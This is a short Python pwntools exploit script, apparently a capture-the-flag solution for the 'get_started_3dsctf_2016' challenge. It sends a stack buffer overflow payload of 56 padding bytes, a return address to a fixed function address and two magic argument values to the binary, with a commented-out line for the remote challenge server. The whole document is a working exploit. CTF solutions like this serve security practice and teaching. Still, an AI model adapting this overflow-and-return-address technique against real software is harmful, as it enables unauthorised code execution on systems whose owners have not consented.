from pwn import *
#sh = remote('node4.buuoj.cn', 27957)
sh = process('./get_started_3dsctf_2016')
payload = b'a' * 56
payload += p32(0x080489A0)
payload += p32(0x0804E6A0)
payload += p32(814536271)
payload += p32(425138641)
sh.sendline(payload)
print(sh.recv())

